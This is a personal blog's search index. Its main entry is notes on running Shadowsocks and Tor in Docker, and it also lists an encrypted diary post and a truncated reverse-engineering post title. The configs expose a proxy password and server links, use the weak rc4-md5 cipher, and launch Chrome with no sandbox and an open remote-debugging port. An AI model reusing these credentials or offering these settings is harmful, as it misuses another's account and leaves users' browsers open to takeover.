<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="2024/11/01/%E6%8A%98%E8%85%BE%E5%90%A7/fw-orca/"/>
      <url>2024/11/01/%E6%8A%98%E8%85%BE%E5%90%A7/fw-orca/</url>
      
        <content type="html"><![CDATA[<h2 id="GFW"><a href="#GFW" class="headerlink" title="GFW"></a>GFW</h2><h3 id="SS-image"><a href="#SS-image" class="headerlink" title="SS image"></a>SS image</h3><p>dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">22.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt update &amp;&amp; apt install -y shadowsocks-libev tor vim curl</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> sleep 1000d</span></span><br></pre></td></tr></table></figure><h3 id="Container-for-SS-and-Tor"><a href="#Container-for-SS-and-Tor" class="headerlink" title="Container for SS and Tor"></a>Container for SS and Tor</h3><p>docker-compose</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker compose -v         <span class="comment"># 新版docker compose集成到docker CLI中了                                                       </span></span><br><span class="line">Docker version 24.0.7, build afdd53b</span><br></pre></td></tr></table></figure><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.8&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">ss:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">ss</span></span><br><span class="line">    <span class="attr">environment:</span> &#123;&#125;</span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./startss.sh:/startss.sh</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./ss.txt:/ss.txt</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">bash</span> <span class="string">/startss.sh</span></span><br><span class="line">      <span class="comment">#command:  sleep 100d</span></span><br><span class="line">    <span class="attr">network_mode:</span> <span class="string">host</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">  <span class="attr">tor:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">ss</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./starttor.sh:/starttor.sh</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">bash</span> <span class="string">/starttor.sh</span></span><br><span class="line">    <span class="attr">network_mode:</span> <span class="string">host</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="startss-sh"><a href="#startss-sh" class="headerlink" title="startss.sh"></a>startss.sh</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">i=1080</span><br><span class="line"><span class="comment">#ss-local -s $server.graniterapids.com -p 22669 -l $port -b  0.0.0.0 -k fvLLVD -m rc4-md5</span></span><br><span class="line"><span class="keyword">for</span> dm <span class="keyword">in</span> $(cat ss.txt | awk -F <span class="string">&#x27;:&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | awk -F <span class="string">&#x27;@&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>); </span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">nohup ss-local -s <span class="variable">$dm</span> -p 22669 -l <span class="variable">$i</span>   -b  0.0.0.0 -k fvLLVD -m rc4-md5 &amp;</span><br><span class="line">((i+=1)) ;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$i</span>;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;start to sleep&quot;</span></span><br><span class="line">sleep 10000d</span><br><span class="line"><span class="comment">## 这段代码的目的是从一个包含 Shadowsocks 连接信息的文件 ss.txt 中读取数据，并分别启动多个 ss-local 进程，每个进程使用不同的服务器地址和本地端口。然后natstat 会有大量的ss-local进程的链接处于listen状态</span></span><br></pre></td></tr></table></figure><h3 id="ss-txt"><a href="#ss-txt" class="headerlink" title="ss.txt"></a>ss.txt</h3><p>有两百条以下</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ss://cmM0LW1kNTpmdkxMVkQ@jp18.graniterapids.com:22669/?group=5LqR#%E6%97%A5%E6%9C%AC%E5%A4%A7%E9%98%AA%20%E3%82%AA%E3%83%97%E3%83%86%E3%83%BC%E3%82%B8%20B%2005</span><br><span class="line">ss://cmM0LW1kNTpmdkxMVkQ@jp19.graniterapids.com:22669/?group=5LqR#%E6%97%A5%E6%9C%AC%E5%A4%A7%E9%98%AA%20%E3%82%AA%E3%83%97%E3%83%86%E3%83%BC%E3%82%B8%20B%2006</span><br><span class="line">ss://cmM0LW1kNTpmdkxMVkQ@jp20.graniterapids.com:22669/?group=5LqR#%E6%97%A5%E6%9C%AC%E5%A4%A7%E9%98%AA%20%E3%82%AA%E3%83%97%E3%83%86%E3%83%BC%E3%82%B8%20B%2007</span><br><span class="line">ss://cmM0LW1kNTpmdkxMVkQ@2001:e42:102:1523:160:16:95:158:22669/?group=5LqR#%E7%BA%AFIPV6%E6%8E%A5%E5%85%A5</span><br><span class="line">ss://cmM0LW1kNTpmdkxMVkQ@us06.graniterapids.com:22669/?group=5LqR#%E7%BE%8E%E5%9B%BD%E5%AE%9E%E9%AA%8C%E6%80%A7%20IEPL%20%E4%B8%AD%E7%BB%A7%20B01</span><br></pre></td></tr></table></figure><h3 id="starttor-sh"><a href="#starttor-sh" class="headerlink" title="starttor.sh"></a>starttor.sh</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> Socks5Proxy 127.0.0.1:1287 &gt;&gt; /etc/tor/torrc</span><br><span class="line"><span class="built_in">echo</span> SocksPort 0.0.0.0:9050 &gt;&gt; /etc/tor/torrc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;EntryNodes &#123;us&#125;&quot;</span> &gt;&gt; /etc/tor/torrc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;MiddleNodes &#123;us&#125;&quot;</span> &gt;&gt; /etc/tor/torrc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ExitNodes &#123;us&#125;&quot;</span> &gt;&gt; /etc/tor/torrc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tor</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ss-json"><a href="#ss-json" class="headerlink" title="ss.json"></a>ss.json</h3><p>从官人痴获取<a href="https://管人痴.com/user/subscribe_log">https://xn--gmq396grzd.com/user/subscribe_log</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;server&quot;</span>:<span class="string">&quot;uk01.graniterapids.com&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;server_port&quot;</span>:<span class="number">22669</span>,</span><br><span class="line">    <span class="attr">&quot;local_address&quot;</span>: <span class="string">&quot;0.0.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;local_port&quot;</span>: <span class="string">&quot;1080&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;password&quot;</span>:<span class="string">&quot;fvLLVD&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;timeout&quot;</span>:<span class="number">300</span>,</span><br><span class="line">    <span class="attr">&quot;method&quot;</span>:<span class="string">&quot;rc4-md5&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;fast_open&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;mode&quot;</span>:<span class="string">&quot;tcp_and_udp&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Chrome加载user-data"><a href="#Chrome加载user-data" class="headerlink" title="Chrome加载user-data"></a>Chrome加载user-data</h2><p>执行cra.sh,需要先配置当前的用户环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">/opt/google/chrome/google-chrome  --user-data-dir=/home/king/Desktop/chrome/dark1 --profile-directory=default --remote-debugging-port=9222 --no-sandbox --window-size=<span class="string">&#x27;1500,1000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#echo /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --user-data-dir=/Users/freud/chrome/$(ls /Users/freud/chrome/|sort -nr | head -n 1) --profile-directory=survey --laneg=en --remote-debugging-port=9222 --remote-debugging-targets=http://host.docker.internal:9222 --whitelisted-ips --allowed-origins=&#x27;*&#x27; --window-size=1000,1000</span></span><br><span class="line"><span class="comment">#/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --user-data-dir=/Users/freud/chrome/$(ls /Users/freud/chrome/|sort -nr | head -n 1) --profile-directory=survey --laneg=en --remote-debugging-port=9222 --remote-debugging-targets=http://host.docker.internal:9222 --whitelisted-ips --allowed-origins=&#x27;*&#x27; --window-size=1000,1000</span></span><br><span class="line"><span class="comment">#/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --user-data-dir=/Users/freud/chrome/ProfileSurvey --profile-directory=survey --laneg=en --remote-debugging-port=9222</span></span><br><span class="line"><span class="comment">#/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --user-data-dir=/Users/freud/chrome/test --profile-directory=survey --laneg=en --remote-debugging-port=9222 </span></span><br></pre></td></tr></table></figure><h2 id="orca"><a href="#orca" class="headerlink" title="orca"></a>orca</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>清明时节雨纷纷，路上行人勿断魂</title>
      <link href="2024/04/06/diary/diary-240406/"/>
      <url>2024/04/06/diary/diary-240406/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e11a7c3ca0ce41d1dd7e9c4817e557c91819afc42637899fdd6bf5044e0df922">c05db5c9326e1a204d18d71a654b071f4a0c98ddba835983d83af0dfc14cfdccee12b915d0eaee0f88af32c622bd7b6b4c43d4fb57cd1a3c1af0446db7f91fb2df55de0613e9afe21a2a2f4d8b1ccaf4c3586f6ef20d69198516d3b56a4bf0b5f00eb23478e4108e0ede04daa9554df35c5e799e07fee213212a7dbb211180a9df91a608c7167ebee161cdbb4cafd4488da871ebf4b801c39d8df03639d85d3470608cfc433da7f1e72f00defb12a03625c0a9ffe2dc742766c8c267f7b9a8305d88ab1836ccf24ec18687ff7599423bac25086271d99d86a30e1bea71919ecf8d31c16d741771905aea0f5e588fad0fdf93c69cab9b219bb0fb5e12093812ad6edadbbdfa8d2307984cf0784f7867635e76725ba8de8321dd67353e8d4ef2e755ff257658d7560fbf3066da80735696ce83044a7360fa185216dfeaa5ff5b9afa3e6629f1f589e88bd5e9e1793e9ad7e37473bff9053a10f6ed55b8ace8be0159c2bfd0a205f26dca0858e5d24f7df4c4900b6c084f5875783fdaa6b05068a09acbfbc18c0fcbb9a42e9987ecd88d9bbde06280b60e036331ec386e4e25da2b150ab2f7b7dd01d6338616d793e4cc745ec699d779891fc325b828939872ab458a96359a993dbaf7346d9c4a5221c137c628dfd71e567e29211ff6f4f3ab8694bd35e4ac5caa9efd3394fb5b494307cd756b8fed54a5614207f3d9828205ec437b7e622ca9e8e4c81229b3b13bee28c11478da32ab13ad37aad42eeed3c870245c6346422ea68c4d24127631447a2cecf7e5f0fa4986c5a3559bfd0664b1e992ae85c7729a2b87ff041879b0a25d9537dba59e3303655d2362ea9f1cb4c24e61cb921df590b73cd48964fa9012040b3ce60d31a6c011cf7426848bb4d6c5ccb5794854242266e5c816251c90e62a258eda092beee05328f886c750a79d45d9a29332bb8c6942df68a1041c45ad66860a9c79dcf3b41a81d71b0479f04030b7c7e099460880cb4226ed290d3c083ae7b7efbc101c14e32637a03caed768c1902354dd20b6eaf330b53921bcf0e45337ef4f29e879df79dccf26dfbf4175c2d311ee4816ced5474510f104223dcbcb384442ecc2fae4136646b1b331daa436646dc8e1741477c0f5643ce2f579651a2b58d8ad471c789ec93e0a07717f904c9e6941175d7f462095be85ca733740ccc88e473f8c9c291a9db33118e6b188071f1eed7dabc58c25791dccf3235d9fe33282433d998471da0972d7a993958fd48972d29bc41929fc7629c58b8cb1c6a70365d5ae59be87ca8be554389e18699a14488df21f31950722adbb860e8af4793cd6a40b2d8d1dfc054666e342e60cacb609f1367d4f294f0ccacdf72e2cd141a4df9d6006f1d570f62923071716b3a76c9562f475e55232847ac64129d6a340845727e77d8a5ef5d8f9175cd2dc1fdaa711102faee3c526473bf8eeff0953cebf7ead0a23e4b90f8796662acf92f5f6c7214e4aad0ee79007344a9a8584d9d9bb99929f32f5847339aedd8ff17f1e88f591f32666799c68c6a3eba4ba215c9be627be2fdea453c7f2fd7b34cfb76446e2373354af24b2ae93007d985deb260708fa0e9c69b6b2905afeec6f5a610cfbd216b584fd6068a5782609555048c7e10667573c6ce6489c260c6ec7532016dbaa1b2bf5036dfcc08e9e5bf2722ee5b0cf79175fd2e4c81d1a1d8d5cb0294e94fe01cd6e03846f6e7ca6aa99e36fa07a9d67c272762248212ce73cfdaeba6a4f0265479993d3c9519a6228a9d83fe3bc8428001b384f3b487b768530a1911a2153bb48c4915bbb04fcf34b0cf80001c309cf1142df3a932583b4b2c08e05551a553dab9ac4b52f952f0dba14409f709dd2ba993a3bf8c61b527bcc83439c9553c1bf18b10eb6b776e5a6bf75f55faaf682c4d26966109e7569368f2875a6935bf02b307da0f31dc6e963ffe7386189db9a08da9f0be642e6ffc8066974573af4723626b8bdfdd7cd8cffb98fd9d754a9bf08a1d04d988ccf60aa1d1780ea9a0d1fcc9323f493d493fbcfe44d25a898291fa2d60661d9ac4ea5a7db768f3c53dce34fa74b9e5c24c2f101b779903820be2b2400fda3a0042e77a0a15c06fc252054af3bd720c1efdf1e75e0969159e3c7f2457c43db2e672ad561f9ddfa4ec11f39d10afc392dc40604242ab365793e65fd93bff26703777fb3ac826a6016bc9f4b24b1c342dec44824e2f2145e1da365e7de2b7e7be5b170b470a081edfb0b4c4a031c7e39c40402c522086168897028bbcd4ef73944772cbd48ca96006b25086a871a37ca0e3181690c58ab2398bb25f05c3709ef6d8a90e3a64579347e3d1c54002983cbdfc43370caab4c0d70db17df99e918e21b1e08970bece84b17a59a39aea6280e6c081b3d4bc6fb60b5055314ff15bb1ac70a6434d773aeb201ba376396f7a99267140973cd492b474bac65d05ae1ea402e837a5431bb8e4ef41e00c4f40cf3f73aa97d445d00b225fe963dabbf30c7ab5af595bbc25f719ab8ce9cc484bbbbfcd132a72233634ee207f95dc31bf90ff6927b2e72804e89625f8f0ed34765df1de9e97d4b7e1c87550992aafd5def1a916572909be36920ef1aa08beb379675ba3f0cbb0e5c9b3df8162f2febbad30596155e1ee801b6ee46742632ec8ad7e22ae4e7a153f9b2b83e8d03b8ddfc8c5b9d8f297859a3520e6f10a9c720a12a47b1a39b6cbb367e5995534e822602f7f15bbdbaf407fc5a16009999787178dafce95f9a779370ed876051ebae021316177dce3529873891688969614ec8e15d2bd4ec4043c7bdf2834acb1c8179e0bc8a889d85b5a8e182628c8acaa48c239981e10c7ce41a914ebcc72ebe183e64e0fc8e1a15ef90d5e800dbffaaaf0228303dd84ce2dbbed9b616030e95a1da6a4956c31c4a91b8d5540a0b6d61491e68c9228be18e6f75feb4f2ca344d7226bbf3639560013ce4433276ae66ab9cd3310c293f5ad574eb83289e8b09110d59dd80c0e8f40f78a667a38e4eaac652d756821c7d6bdcbedcf1a397551a03b495baf1d756f684730b9ca6c9b8226da524b8dd02fe5553be30df532d86ffd1c5c1596904ee7c4dd935d2d8365124dc1d36fde6504baa451b2a223c32804f230de6890ea93f89ac9cb9777f5641347f422e0e4c7366103bd571af8f485d887c61086327511ce9c943636bb024eeaab970deb1e033085442c10432e1ffac3910b05bfb3bc76bf040510daabd1636b608c95eb5e31f7d40c9b2f8fda684804ad7b0cdc8566994ea896632532f6ed21f00b1d697de280500e7a9898dc405cadb09b2b0d49b1114ade6b3982bba4878cf97765f122f0b0c9ee1939e17af55e1f5f6df8fe343f22b9faaded84bae4f9738a9a677fd816f58d2d942d81c905863c25172c70eca080faddda4668093ee9cedba96d2e83df75f15cd253a3c1cd00050eedfb1fa9ca5eb6e9db0701e0917f12e7050d30fbfc48bad8614437967f3eb0a1b9e3611ad5ab1491095e7d2cb87775c222b6c9eb11b4790213199163eacbe9098a7197dcc16a3fa3a88b5753e87a100fb0391da662922e4bfbc2f522c6fd035b6182587e0237469e29513a8a78e2bb1bb790f9029302a49b860bc3928213bdedfe38ca73182698cbcbe675f1634593d1881f20759c66e9bcbd9e5f1532bd9c1ae54e5f7922207afa7f071947c38058b50a8f26d2009007dbbe978c651e1162a2dc1631875b9dcdef504582cd50b208f0f6f7d2b4ed6f83aae6f6921047ff9aa8996a4f749ffbf9dcfd1a552d81922c814d438a4d1f8a3e1d5fff6521e09f192ebd563a3487e52b75d6e59ba125259ecfb61688eac52e23244ff038135e1f50d290dfd1179f16efcb39f1d22329e84c9545aac4c44f5cb77557fe68fbfd1b4d2300d97688160076fc528e4bfb0b11a1c29e913066cce4270ee268b539f88384d0a4b7dc570b2f3335a704f90cf859c3e03bb45d7b18b8fcc9d0930fcffb10cdb7b4cd60caee98418410b2d11a61da93ddc81772471b715ec7fc8ca97763013ab4208ecc4fa0410b00624d98b68083713cf010c70347ffab11d268b7096735466537af408e06c98e31927945777b0baee5cd0daf4cb95578b823a0c90b823f24af3d5f186a970e421c77a77c10c6316cb549174179256f41ab1d1fe1789b636af85680b34bdeeb41cff4889687407019890713209e723860305d6eebc528287eb73a7f46df2775a0ad8a84bbd81c6d56f07e78cdee4ceeefd85c997db4115f1c93e6018ad19cf0050ec6b74a69c765f1fd7c1a0ec9cea16f6ac5909261553e620c5b9d0ac67b5fb38488fcfbb2ac7e6c5b48774d2271abfe8e6079d85ae86a028eabfbe0210f1814d3c9c6e2467cb0e7d0244841979bddeb90ec3efcc7a794e2d11f62f6e12ffab784901b983db9d74e120e5b2dc07ac0baad838ce67b6d4bfda40c6dd0f435efb915f42b01a33ee0822b47631c741e3ea26deb50af64a247cca371f848da60331a0a86f9782cfb2e9ead72f869fd16925d80b747893238502e60793050f412e78dc0f8380e1e8a271ce7c01721eb3864061a5c4aa9d2e1dd81d337714ecb637eaaaf8417acc56bb142883e57947b1811850c6f180953ea613b9e22a6d18cf3db2ef5a69f0c4c58461b92a29030aaf8ae24a3239529370bbf8883a983e062da70bf801a9360a5b5603885976b292ebccd063d121150e6001f6fa76284ef8e591e1331589d52f98035ba7b0b5bb6a64f58781a696b88c82afd834fd07464dd845f790f98e8bc9a42f7bd6e8468a9c165cf96d919b9feab057fa1eaa1e39947e0651c5351f0c0227955ee20c5b86209f76acb7f0e7c6c168350dbb71f76ecbba5d9b9df9bfa59a71d3a86de8c767ad85ceb19a0af0009abee6240900e82a749cea331c64424402f0cf02831bc340fb9414ae4f0e5f5a3f4fa8f4f62316d326c1c414648d79a332bc20a5c93335b50cec3bf588a121c7e04b24e298b3616cb0a5b48f938dab0d398b299dd63439468f5e464c975b803a636c7e6bc849d7a232a0181ec581fe5a58ef125369063b64b01b67d6439222a391f9744ef1160e7769b7b518a03e481bc36867eef5871202288d56ca6c222a885d7556a23f077900ea949d64f96a335171761bf055313a6a17899724e60ec78a1c68b03b7a1d134e82abdc3c5ec048473e967fd23ec78b0efcf9c6bd186f327d68ebd60667872401780a3fe05fe9a05deb243783a74cf746fa5e9b6ae04d2f2f58ddef986f58827e644c477adbd402b878050af119822a0f509fe3a59a8f6ee632c16cbb0e300f2b003d23ae3456088f5d34f397f8fc36ff0875c71e79b1c98f43609b5ee279ec111b5c349df2b6c02f12d432d186244e8180c9a0e1a99e96a976561d18596748a4621f6eaa5822b0f4c9f84006b65771007b7e61c3ef637d2f07efcda58d7a294ea75a3e140d156ea9e394c01a335eceb54dcaeac090b3a9403ee81282833a1fee29ffbb4c22b7ac52f15d7419f7fccf34fc8157861d984e865bb57a4c8556eeb392db9e1b742bf5edbe8df3b8682c8f1888b21301e9c919ce9e2c1faf0c566718b907a89e6f7faf08711507ae7e2a42bd72c4422d44d482cf1947aa8d39147eedd734a7e4dc352f05da3fbf190a97617a44768500c695d5249b6728f815a2ba212d0e9aa549ae655f5a9476fd147ab8e55f409f4e317ff4307d3b8115dd80e6f5931eedcde40b96f2ed96dff5ac04174206dc07b595c35200785ffe592b30b7cf1d6af73630b19ee294ca8a50e2825b9bec65a4df8b5baf02bd463b7e02743d58823fc1cb3e1a6884210ace89570dcfa98394ac8715cd86046b9e1e007cfc81f28b54ed32b224e7948c789c223b92dbf7e2e32807f73f16b63205815b694cb4034c6a6202df3524947a57b95f62f7bfd2ba7404c23fa76b8a5de6d7b4e96afb6b1f86ee64534aba99c2d67b85cfb7e03d74ad06c04ec68b25b082a64d47abb992e73c77431c61fa3ed8a1e12319c289b36104a3538ff4d3f6e0b95159d587067c6b090de5d928f845b7ed5a4b23c5aeb6cb91df1cdd16c4fe4252919d58c9a1d785b49f0d0b4258786855e15f9f9877ab9e37df800d17ec9e60260b154ccf27f06816fb3020f9b475607846769ec21b89f0372b1b1d4ed01a420e0dbe25261e0cdb6a3a9e28ff325a745c6a768dad4c813dfb0035189f59605a05650e798719b0a227d81fcf4de9679e4b08118b710bef63af36d4b1c5f6a5f4172d0b4a7e2ef0a4cba49ca1e91ef90cec40bcc4e6bb46e50009123259d395536957a1e60445d06dde5bbe1048e6ffe8888cfa359b4fed4f4ca5bff4330bf18bb8b34376c2ceb209b727841b4bb52f624f78f3fed827541dba305e94717b079b617a3bd05dc554dc4372483bb00b6e2745e772674f6211ed78120aa839a4e067193fb2cb9bb80cf62e25624d3782d99edd3ba917aeffabb9e0b6ea9af380889bbd563a3da6ff1dcf84e11e2ddec43f2ebf86ba9d6a153b8ed0b9ef6679e7384565d2b0c2bf7a8cc131450c35f8fb2431ccdf10588f057bbc0eacb2c6f4f59344e3e6daac3a0081ce3e30579b9f90dbaaae4c7d30447c8086cd4bb7265e357f21373646ae661cd58a03a3d360f5211eb6ca927c178e4cc3b02268a66a9a3d2e268545b4c1751aadcdb5dffaa4cf7deab7eea7fed4481dbc22e3535be48a0fe1f405570fde19754984802140b3c054d3e636511a3b7064b8a8af8d745d11e310a5ad47b585bc83f4ba9af8d7e60d3d7774e3f51594829e8f7c93aa481bccc127953a16a756ffa95f7298af33784f8d164d70d9fc05e3652e15a6e696f702b348c411003708700a9cbad23dd0a4a4f6739f1e81f8c7032ff4bd25cae29c2f894c0cdaac0fe210c19cae6aa7cbc9864fbe2e19abec8fe7c4a7d4c5a0c99e4521892f23eb0a768ae6d706a949c6b0310ce71a49a9d2f51b9c01af444ddad47b1421229b5978cbd90c06da20546834aa04a3b7b2e665a5e7fc8fa8ae9563843816d3d934cce7098382dcf9f7b58b5d2aebf3bd663e4032b6c0ebe001e93a1bf4f351fb909dbb2c6ec93895924826358677bf1eb8906fd40d3f901753c04bfa64999ef6b7c6c5525e243b3712728801987f7c105e7ad50947754fef4b243774d2d151d509bc9477083e1aabfa794ee4b955d1252067f8238a5ad40b9cd6b6432a6574a57dc23ef4ddb8cb75504ab3d7142671e69ad3676b17cef5af5219028e320389e6d2fdc9b135a80ab59bf62b0a92300eb76b765673838c49ec019f4005ed34a1b794534086be9aed03b461d9174c1e01d52f5d11ca2c263afe7c271358db74c0d5d3024e7229ca6661692e5c650e56af006910624b7cfd3c0bfbb5ebd231d8d54417f79a85f08d0b5f05a49ae38240bfc8d898a110e8fc8b5b5eefb61f594b80ec0a0e9c21a7ef7e8e486f4ecbd1d8bd23cff159f8aedd8bea50b3e864b7230d02b1292467bfc366b16e03361c655ab36ceb72e4595b9d09c75bb1188ae6df4778c340b120ec6390e2b137002f3bc259b5cd25535017e7564b90aa90df2c590a9b06accbab2891b4f2dfb16df100453b68db036a9c1dd586f4ba1f6d915e9e9ddb6a4381af96e83826a399ff0785d78566ee5fd10bbd309d0f14d0c48c90febc6bad91224b7857931a992fd25e21124f7f207866ae20f237c12c5f635cf6716ee9c6a1458e8e31f2c762d5f022204da3f116ac0442a8b161584dd2bf2f886bd3c532a53ebe8fafbdc24b4cdd3da0ef977bc8b98192deb01ec06b9d09f6d1d3e93519cc29bdd1294a9509391da3ea58f0bb57c7b45a65537ea9d095e9af0b84c76b051a9f4ee2cd9e7ac33704993b96c327403c24888b36dcab24e29ebb03869eddbbd952aa555be04b79c8eec31b6bd32e93bc30abcdb6250c952dee8b411ad81575c62f520424f3dde9bd4ea3261cc49aaadb8b37f3bda868f0e443031bf85104c5f82b2bd38757dcf2994c8b490bdb04aebefda9c7a6eb2dd50377a6869f721c74179e26531b597fec098a959c0202682ab458615609a21859f3e1ad5ef31a25f44cfe45d42bea78b2f8445b5a1bdf74b62f2bdd4821025b9c595444f69d1bd3d7b88656e65a9d3d5303325a8b587475f07b921d5437447c0a873eb066219da8c7d4f5eaa56b9d4322b23af042175a0ebd267fe7db97fff4ef2b40b9fc975e414432e5f83da2fb44cf0b66ced598d6f22f1699ef98f782aa939a28f5f81bc5b3f39c60fbeb6191d49d6ec1ff2b44037eae8cf8391e587b3132f437c10c1334865d9eda637cc004f1fb04283e432cc5676fb8e2cb338478cd25c63b4a653883c9acfb941d1aad00b88d2e54b0b309f2a22f07776cd2a69b9bcf206b75499910c6392458be299ada10cbcb0c337cfb6a3fb4f7345b382bc53023ef3469081dc8e1fbb025c12a98285cc09e14fbd9909a4dc0da48a308a938bd783d2a170f8d50bd30b398247d146ff222106064687b3cb353337bfa5c2aab03d22f66c78a6c9486611924e99ccf5a87d30c21fcba25282b407c31ab16f937080e2463861a1f6bd1b72876b0df0dc7608793b711cc6277215b64aa7d53cfdfabf65e7beea3483744d7d0b2c8af27d17c6d1dc4532276b98e49cf98f5dd5d1a26a2daadf9c0f22ed2d634861f7be13095c9a8a3380cf4c34c310a12a89246d6a3619b480072fb007712f855d3e9d23f35ad4fb7ad472194fa1bb0e890383a788d91e3dcbfb5c4c3a08d28bfdc37faade73dca0d3c2adeb9f01d64202dfb273d58c5331b30ea46cf6d66a171d22621576e009716e772a9f676d52cbf2e0f31adca</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用ida制作rdpwrap.ini</title>
      <link href="2024/03/29/%E6%8A%98%E8%85%BE%E5%90%A7/rdpwrap.ini%E5%88%B6%E4%BD%9C/"/>
      <url>2024/03/29/%E6%8A%98%E8%85%BE%E5%90%A7/rdpwrap.ini%E5%88%B6%E4%BD%9C/</url>
      
